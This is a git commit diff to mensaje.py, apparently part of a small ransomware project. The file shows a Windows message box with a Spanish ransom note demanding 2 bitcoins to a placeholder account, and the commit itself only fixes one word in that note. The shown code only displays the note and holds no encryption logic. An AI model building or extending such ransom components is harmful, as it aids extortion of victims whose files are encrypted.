b60f2b341363454a4548f500af5cfcdf6b687333
sk8abraham <sk8abraham24@gmail.com>
2019-05-26 17:51:49 -0500

    Update mensaje.py

--- mensaje.py
+++ mensaje.py
@@ -8,8 +8,8 @@ label = ctypes.c_char_p('Tu equipo ha sido infectado')
 #como arg recibe el nombre del archivo que se ha cifrado
 #Mensaje mostrado, si el exe recibe argumento, lo agrega al mensaje
 if len(sys.argv) > 1:
-    message = ctypes.c_char_p('Tu pc ha sido secuestrada. Deposita 2 bitcoins a la cuenta qwerty12345 para liberar tus archivos. Seguira cifrando mientras no pagues. Archivo perdido: ' + sys.argv[1])
+    message = ctypes.c_char_p('Tu pc ha sido secuestrada. Deposita 2 bitcoins a la cuenta qwerty12345 para liberar tus archivos. Seguire cifrando mientras no pagues. Archivo perdido: ' + sys.argv[1])
 else:
-    message = ctypes.c_char_p('Tu pc ha sido secuestrada. Deposita 2 bitcoins a la cuenta qwerty12345 para liberar tus archivos. Seguira cifrando mientras no pagues.')
+    message = ctypes.c_char_p('Tu pc ha sido secuestrada. Deposita 2 bitcoins a la cuenta qwerty12345 para liberar tus archivos. Seguire cifrando mientras no pagues.')
 
 ctypes.windll.user32.MessageBoxA(0, message, label, 0x00000000)
